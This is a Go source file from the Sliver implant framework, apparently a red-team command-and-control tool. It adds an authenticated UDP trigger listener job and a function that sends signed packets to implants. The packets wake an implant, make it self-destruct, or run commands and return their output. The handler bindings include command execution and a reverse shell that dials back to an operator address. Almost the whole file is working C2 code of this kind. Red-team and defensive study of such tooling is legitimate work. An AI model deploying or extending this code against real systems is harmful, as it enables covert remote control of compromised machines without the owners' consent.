package c2

/*
	Sliver Implant Framework
	Copyright (C) 2026  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.

	------------------------------------------------------------------------

	StartTriggerListenerJob is the Sliver job-factory for the
	authenticated UDP trigger listener. It bridges a clientpb
	TriggerListenerReq into a runtime listener instance from
	github.com/0x90pkt/trigger/pkg/listener and registers the operator-
	supplied task bindings against the Sliver-side handlers in
	server/c2/trigger/handlers.

	The factory follows Sliver's existing per-listener pattern
	(StartMTLSListenerJob, StartWGListenerJob, etc.): NextJobID before
	core.Jobs.Add, a watcher goroutine that listens on JobCtrl, no
	manual EventBroker publishes (core.Jobs already publishes
	JobStartedEvent / JobStoppedEvent internally).
*/

import (
	"context"
	"errors"
	"fmt"
	"net"
	"os"
	"sync"
	"time"

	stdintents "github.com/0x90pkt/trigger/pkg/intents"
	stdhandlers "github.com/0x90pkt/trigger/pkg/intents/handlers"
	stdlistener "github.com/0x90pkt/trigger/pkg/listener"
	stdprotocol "github.com/0x90pkt/trigger/pkg/protocol"

	"github.com/0x90pkt/trigger/pkg/auth"

	"github.com/sirupsen/logrus"

	"github.com/bishopfox/sliver/client/constants"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/server/c2/trigger/handlers"
	"github.com/bishopfox/sliver/server/core"
	"github.com/bishopfox/sliver/server/log"
)

var triggerLog = log.NamedLogger("c2", constants.TriggerStr)

// triggerJobState holds both the proto bindings (for operator
// introspection) and the live handler registry (for direct dispatch)
// associated with a running trigger listener job.
type triggerJobState struct {
	bindings []*clientpb.TriggerIntentBinding
	registry *stdintents.Registry
}

// triggerJobBindings is a process-local side-map storing the state for
// every running trigger listener, keyed by core Job ID. The factory
// writes on Start, the watcher goroutine deletes on Stop. Consumed by
// the TriggerIntents RPC (operator introspection) and the
// TriggerDispatchTask RPC (ad-hoc handler invocation from the console).
var triggerJobBindings sync.Map // map[int]*triggerJobState

// BindingsForJob returns a shallow copy of the registered task bindings
// for the given trigger job, or (nil, false) if no trigger listener is
// running with that ID. Callers get their own slice so mutations do not
// affect the canonical binding set.
func BindingsForJob(jobID int) ([]*clientpb.TriggerIntentBinding, bool) {
	v, ok := triggerJobBindings.Load(jobID)
	if !ok {
		return nil, false
	}
	state, ok := v.(*triggerJobState)
	if !ok || len(state.bindings) == 0 {
		return nil, ok
	}
	out := make([]*clientpb.TriggerIntentBinding, len(state.bindings))
	copy(out, state.bindings)
	return out, true
}

// DispatchTaskForJob resolves a named task handler on a running trigger
// listener and executes it directly, bypassing the UDP wire protocol.
// This backs the "trigger send <job-id> <task-name>" console command.
//
// A synthetic Event is constructed with Intent=taskName; the remaining
// fields are set to sentinel values indicating a console-originated
// dispatch (no UDP source, no nonce, no client ID from a packet).
func DispatchTaskForJob(jobID int, taskName string) error {
	v, ok := triggerJobBindings.Load(jobID)
	if !ok {
		return fmt.Errorf("no trigger listener with job ID %d", jobID)
	}
	state, ok := v.(*triggerJobState)
	if !ok {
		return fmt.Errorf("corrupt state for job %d", jobID)
	}
	handler, found := state.registry.Resolve(taskName)
	if !found {
		return fmt.Errorf("no task %q registered on job %d", taskName, jobID)
	}

	evt := stdintents.Event{
		Intent:   taskName,
		ClientID: "console",
		SourceIP: "127.0.0.1",
		Nonce:    "direct-dispatch",
	}

	triggerLog.Infof("console dispatch: job=%d task=%s", jobID, taskName)
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	if err := handler.Execute(ctx, evt); err != nil {
		triggerLog.Errorf("console dispatch failed: job=%d task=%s err=%v", jobID, taskName, err)
		return fmt.Errorf("handler %q returned error: %w", taskName, err)
	}
	triggerLog.Infof("console dispatch success: job=%d task=%s", jobID, taskName)
	return nil
}

// FireResult holds the outcome of a bidirectional trigger fire.
// For fire-and-forget intents (wake, self-destruct), Output is empty.
// For bidirectional intents (exec), it contains the implant's response.
type FireResult struct {
	Sent     bool   // true if the packet was sent
	Output   string // implant response output (exec only)
	ExitCode int    // implant command exit code (exec only)
	Error    string // implant-side error message, if any
}

// FireTriggerPacket constructs a signed trigger packet and sends it as
// a single UDP datagram to targetHost:targetPort. Everything is handled
// natively within sliver -- no external tools required.
//
// The packet follows the upstream wire protocol: JSON-over-UDP with
// HMAC-SHA256 authentication. The receiving end (typically an implant's
// triggerwake listener) validates the signature, checks replay/clock-
// skew protections, and dispatches the intent (wake, self-destruct, exec).
//
// For bidirectional intents (exec), the function binds a local UDP port,
// waits for a response from the implant (up to responseTimeout), and
// returns the output. For fire-and-forget intents, it returns immediately
// after sending.
func FireTriggerPacket(targetHost string, targetPort int, intent string, sharedSecret string, clientID string, cmdPayload string) (*FireResult, error) {
	if targetHost == "" {
		return nil, errors.New("target host must be set")
	}
	if targetPort <= 0 || targetPort > 65535 {
		return nil, fmt.Errorf("invalid target port: %d", targetPort)
	}
	if intent == "" {
		return nil, errors.New("intent must be set")
	}
	if sharedSecret == "" {
		return nil, errors.New("shared secret must be set")
	}
	if clientID == "" {
		clientID = "sliver-operator"
	}

	nonce, err := stdprotocol.GenerateNonce()
	if err != nil {
		return nil, fmt.Errorf("nonce generation: %w", err)
	}

	msg := stdprotocol.TriggerMessage{
		Version:   stdprotocol.ProtocolVersion,
		ClientID:  clientID,
		Nonce:     nonce,
		Timestamp: stdprotocol.NowUTC(),
		Intent:    intent,
		Payload:   cmdPayload,
	}

	sig, err := stdprotocol.Sign(msg, sharedSecret)
	if err != nil {
		return nil, fmt.Errorf("sign: %w", err)
	}
	msg.Signature = sig

	payload, err := stdprotocol.EncodeWire(msg)
	if err != nil {
		return nil, fmt.Errorf("encode: %w", err)
	}

	// For bidirectional intents, use a UDP socket so we can receive the
	// response. For fire-and-forget, use a simple dial.
	isBidirectional := intent == "exec"

	if !isBidirectional {
		// Fire-and-forget path.
		addr := net.JoinHostPort(targetHost, fmt.Sprintf("%d", targetPort))
		conn, err := net.DialTimeout("udp", addr, 5*time.Second)
		if err != nil {
			return nil, fmt.Errorf("dial %s: %w", addr, err)
		}
		defer conn.Close()

		if err := conn.SetWriteDeadline(time.Now().Add(5 * time.Second)); err != nil {
			return nil, fmt.Errorf("set write deadline: %w", err)
		}
		if _, err := conn.Write(payload); err != nil {
			return nil, fmt.Errorf("send to %s: %w", addr, err)
		}

		triggerLog.Infof("trigger fire: target=%s intent=%s client_id=%s nonce=%s",
			addr, intent, clientID, nonce)
		return &FireResult{Sent: true}, nil
	}

	// Bidirectional path: bind ephemeral local UDP, send, wait for response.
	localAddr, err := net.ResolveUDPAddr("udp", ":0")
	if err != nil {
		return nil, fmt.Errorf("resolve local addr: %w", err)
	}
	conn, err := net.ListenUDP("udp", localAddr)
	if err != nil {
		return nil, fmt.Errorf("bind local udp: %w", err)
	}
	defer conn.Close()

	remoteAddr, err := net.ResolveUDPAddr("udp", net.JoinHostPort(targetHost, fmt.Sprintf("%d", targetPort)))
	if err != nil {
		return nil, fmt.Errorf("resolve target: %w", err)
	}

	if _, err := conn.WriteToUDP(payload, remoteAddr); err != nil {
		return nil, fmt.Errorf("send to %s: %w", remoteAddr, err)
	}

	triggerLog.Infof("trigger fire (bidirectional): target=%s intent=%s client_id=%s nonce=%s",
		remoteAddr, intent, clientID, nonce)

	// Wait for response with timeout.
	_ = conn.SetReadDeadline(time.Now().Add(responseTimeout))
	buf := make([]byte, 16384)
	n, respAddr, err := conn.ReadFromUDP(buf)
	if err != nil {
		if isTimeoutErr(err) {
			triggerLog.Warnf("trigger fire: no response within %v from %s", responseTimeout, remoteAddr)
			return &FireResult{Sent: true, Error: fmt.Sprintf("no response within %v (implant may be unreachable or exec timed out)", responseTimeout)}, nil
		}
		return nil, fmt.Errorf("read response: %w", err)
	}
	if !respAddr.IP.Equal(remoteAddr.IP) {
		return nil, fmt.Errorf("response from unexpected source %v, expected %v", respAddr.IP, remoteAddr.IP)
	}

	resp, err := stdprotocol.DecodeResponse(buf[:n])
	if err != nil {
		return nil, fmt.Errorf("decode response: %w", err)
	}

	// Verify response HMAC.
	if valid, err := stdprotocol.VerifyResponse(resp, sharedSecret); err != nil || !valid {
		return nil, fmt.Errorf("response HMAC verification failed")
	}

	// Verify the response correlates to our request.
	if resp.RequestNonce != nonce {
		return nil, fmt.Errorf("response nonce mismatch: sent %q, got %q", nonce, resp.RequestNonce)
	}

	triggerLog.Infof("trigger fire: received response from %s (exit=%d, output=%d bytes)",
		remoteAddr, resp.ExitCode, len(resp.Output))

	return &FireResult{
		Sent:     true,
		Output:   resp.Output,
		ExitCode: resp.ExitCode,
		Error:    resp.Error,
	}, nil
}

const responseTimeout = 35 * time.Second // slightly longer than implant's exec timeout

func isTimeoutErr(err error) bool {
	type timeoutErr interface{ Timeout() bool }
	if te, ok := err.(timeoutErr); ok {
		return te.Timeout()
	}
	return false
}

// StartTriggerListenerJob starts an authenticated UDP trigger
// listener as a Sliver job. The returned *core.Job is already in
// core.Jobs and has its watcher goroutine wired up; callers should
// surface the job's ID to operators.
//
// Validation order:
//  1. Build the keyring (default secret OR per-client; strict-mode
//     respected).
//  2. Build the source allowlist (exact IPs + CIDR ranges).
//  3. Build the task registry by translating each
//     TriggerIntentBinding's oneof config into a real handler
//     constructor. Any binding failure aborts the whole start (better
//     than silently registering some and failing others).
//  4. Construct the listener.Listener via the standalone library.
//  5. core.NextJobID() → core.Job → spawn Start goroutine → spawn
//     JobCtrl watcher → core.Jobs.Add (which publishes JobStartedEvent).
func StartTriggerListenerJob(req *clientpb.TriggerListenerReq) (*core.Job, error) {
	if req == nil {
		return nil, errors.New("trigger: nil request")
	}

	keyring, err := buildKeyring(req)
	if err != nil {
		return nil, fmt.Errorf("trigger: build keyring: %w", err)
	}
	sourceAllow, err := auth.NewSourceAllowlist(req.AllowedSources)
	if err != nil {
		return nil, fmt.Errorf("trigger: build source allowlist: %w", err)
	}

	registry := stdintents.NewRegistry()
	for _, binding := range req.Intents {
		handler, err := handlerForBinding(binding)
		if err != nil {
			return nil, fmt.Errorf("trigger: task %q: %w", binding.Name, err)
		}
		if err := registry.Register(handler); err != nil {
			return nil, fmt.Errorf("trigger: register %q: %w", binding.Name, err)
		}
	}

	cfg := stdlistener.Config{
		BindIP:                     req.Host,
		BindPort:                   int(req.Port),
		Workers:                    intOr(req.Workers, 4),
		MaxClockSkew:               secondsOr(req.MaxClockSkewSeconds, 45*time.Second),
		ReplayTTL:                  secondsOr(req.ReplayTTLSeconds, 5*time.Minute),
		MaxMessageBytes:            intOr(req.MaxMessageBytes, 4096),
		GlobalRatePerSecond:        int(req.GlobalRatePerSecond),
		PerClientRequestsPerMinute: int(req.PerClientRequestsPerMinute),
		MaxReplayEntries:           int(req.MaxReplayEntries),
		MaxRateLimitEntries:        int(req.MaxRateLimitEntries),
		AllowedClientIDs:           sliceToSet(req.AllowedClientIDs),
		AllowedSources:             sourceAllow,
		Keyring:                    keyring,
		ServerID:                   serverIDOrDefault(req.ServerID),
		ReadBufferBytes:            65535,
		JobQueueBufferSize:         1024,
		Sink:                       newSliverAuditSink(),
		Handlers:                   registry,
		HandlerTimeout:             msOr(req.HandlerTimeoutMs, 10*time.Second),
	}

	l, err := stdlistener.New(cfg)
	if err != nil {
		return nil, fmt.Errorf("trigger: listener init: %w", err)
	}

	job := &core.Job{
		ID:          core.NextJobID(),
		Name:        constants.TriggerStr,
		Description: fmt.Sprintf("trigger listener %s:%d (%d tasks)", req.Host, req.Port, len(req.Intents)),
		Protocol:    constants.UDPListenerStr,
		Port:        uint16(req.Port),
		JobCtrl:     make(chan bool),
	}

	ctx, cancel := context.WithCancel(context.Background())

	// Listener goroutine: blocks until ctx cancels.
	go func() {
		if err := l.Start(ctx); err != nil {
			triggerLog.Errorf("trigger listener job %d exited with error: %v", job.ID, err)
		}
	}()

	// JobCtrl watcher: on signal, cancel ctx + remove from core.Jobs.
	go func() {
		<-job.JobCtrl
		triggerLog.Infof("stopping trigger listener job %d ...", job.ID)
		cancel()
		l.Stop()
		core.Jobs.Remove(job)
		triggerJobBindings.Delete(job.ID)
	}()

	triggerJobBindings.Store(job.ID, &triggerJobState{
		bindings: append([]*clientpb.TriggerIntentBinding(nil), req.Intents...),
		registry: registry,
	})
	core.Jobs.Add(job)
	triggerLog.Infof("trigger listener job %d bound to %s:%d with %d task(s)",
		job.ID, req.Host, req.Port, len(req.Intents))
	return job, nil
}

func buildKeyring(req *clientpb.TriggerListenerReq) (*auth.Keyring, error) {
	defaultSecret := string(req.SharedSecret)
	if defaultSecret == "" && len(req.PerClientKeys) == 0 {
		return nil, errors.New("at least one of SharedSecret or PerClientKeys must be set")
	}
	if req.Strict && len(req.PerClientKeys) == 0 {
		return nil, errors.New("strict mode requires at least one PerClientKeys entry")
	}

	k := auth.NewKeyring(auth.Options{DefaultSecret: defaultSecret, Strict: req.Strict})
	for clientID, secret := range req.PerClientKeys {
		if len(secret) == 0 {
			return nil, fmt.Errorf("per-client key for %q is empty", clientID)
		}
		if err := k.Add(clientID, string(secret)); err != nil {
			return nil, fmt.Errorf("add per-client key %q: %w", clientID, err)
		}
	}
	return k, nil
}

// handlerForBinding inspects the oneof Config and returns the
// matching constructor's output. Returns an error if Config is unset
// or wraps a type the factory doesn't know about (forward-compat
// safeguard: new proto kinds added without factory updates fail loud
// instead of silently ignoring).
func handlerForBinding(b *clientpb.TriggerIntentBinding) (stdintents.Handler, error) {
	if b == nil {
		return nil, errors.New("nil binding")
	}
	switch cfg := b.GetConfig().(type) {
	case *clientpb.TriggerIntentBinding_WakeBeacon:
		return handlers.NewWakeBeacon(b.Name, cfg.WakeBeacon.GetBeaconID())
	case *clientpb.TriggerIntentBinding_StopJob:
		return handlers.NewStopJob(b.Name, cfg.StopJob.GetJobName())
	case *clientpb.TriggerIntentBinding_Exec:
		return stdhandlers.NewExec(b.Name, stdhandlers.ExecConfig{
			Cmd:            cfg.Exec.GetCmd(),
			Args:           cfg.Exec.GetArgs(),
			Workdir:        cfg.Exec.GetWorkdir(),
			Env:            cfg.Exec.GetEnv(),
			PathOverride:   cfg.Exec.GetPathOverride(),
			HomeOverride:   cfg.Exec.GetHomeOverride(),
			MaxOutputBytes: int(cfg.Exec.GetMaxOutputBytes()),
		})
	case *clientpb.TriggerIntentBinding_ReverseShell:
		return handlers.NewReverseShell(b.Name, handlers.ReverseShellConfig{
			OperatorAddr:       cfg.ReverseShell.GetOperatorAddr(),
			ShellPath:          cfg.ReverseShell.GetShellPath(),
			ShellArgs:          cfg.ReverseShell.GetShellArgs(),
			DialTimeout:        time.Duration(cfg.ReverseShell.GetDialTimeoutMs()) * time.Millisecond,
			MaxSessionDuration: time.Duration(cfg.ReverseShell.GetMaxSessionDurationMs()) * time.Millisecond,
			UseTLS:             cfg.ReverseShell.GetUseTLS(),
		})
	case nil:
		return nil, errors.New("config oneof is unset")
	default:
		return nil, fmt.Errorf("unknown config kind %T", cfg)
	}
}

// sliverAuditSink bridges the standalone library's AuditSink interface
// into Sliver's log.NamedLogger. Every audit event becomes one
// structured Infof line on the "c2/trigger-audit" logger.
//
// The logger is initialized once at construction and stored as a struct
// field so Emit() does not allocate a new logrus.Entry on every call.
type sliverAuditSink struct {
	auditLog *logrus.Entry
}

func newSliverAuditSink() *sliverAuditSink {
	return &sliverAuditSink{auditLog: log.NamedLogger("c2", "trigger-audit")}
}

func (s *sliverAuditSink) Emit(evt stdlistener.AuditEvent) {
	auditLog := s.auditLog
	if evt.Accepted {
		auditLog.Infof("ACCEPT event=%s server=%s client=%s intent=%s source=%s nonce=%s reason=%s",
			evt.Event, evt.ServerID, evt.ClientID, evt.Intent, evt.SourceIP, evt.Nonce, evt.Reason)
	} else {
		auditLog.Warnf("REJECT event=%s server=%s client=%s intent=%s source=%s nonce=%s reason=%s",
			evt.Event, evt.ServerID, evt.ClientID, evt.Intent, evt.SourceIP, evt.Nonce, evt.Reason)
	}
}

// Helper coercions: the proto uses uint32 with 0=use-default so
// operators don't have to know every knob. Convert to library types.

func intOr(v uint32, def int) int {
	if v == 0 {
		return def
	}
	return int(v)
}

func secondsOr(v uint32, def time.Duration) time.Duration {
	if v == 0 {
		return def
	}
	return time.Duration(v) * time.Second
}

func msOr(v uint32, def time.Duration) time.Duration {
	if v == 0 {
		return def
	}
	return time.Duration(v) * time.Millisecond
}

func sliceToSet(xs []string) map[string]struct{} {
	if len(xs) == 0 {
		return nil
	}
	out := make(map[string]struct{}, len(xs))
	for _, x := range xs {
		if x != "" {
			out[x] = struct{}{}
		}
	}
	return out
}

func serverIDOrDefault(v string) string {
	if v != "" {
		return v
	}
	if h, err := os.Hostname(); err == nil && h != "" {
		return h
	}
	return "sliver-trigger"
}
